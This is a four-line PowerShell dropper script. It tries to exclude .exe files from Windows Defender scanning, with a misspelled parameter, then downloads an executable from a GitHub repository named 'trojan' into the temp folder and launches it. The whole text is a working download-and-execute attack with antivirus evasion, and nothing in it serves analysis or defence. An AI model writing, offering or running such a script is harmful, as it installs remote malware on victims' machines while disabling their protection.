Set-MpPreference -Exclousion Extension exe
cd %temp%
Invoke-Webrequest 'https://github.com/cakeuwu1/trojan/raw/main/alphares_x64.exe' -OutFile main.exe
Start-Process -FilePath "main.exe" 
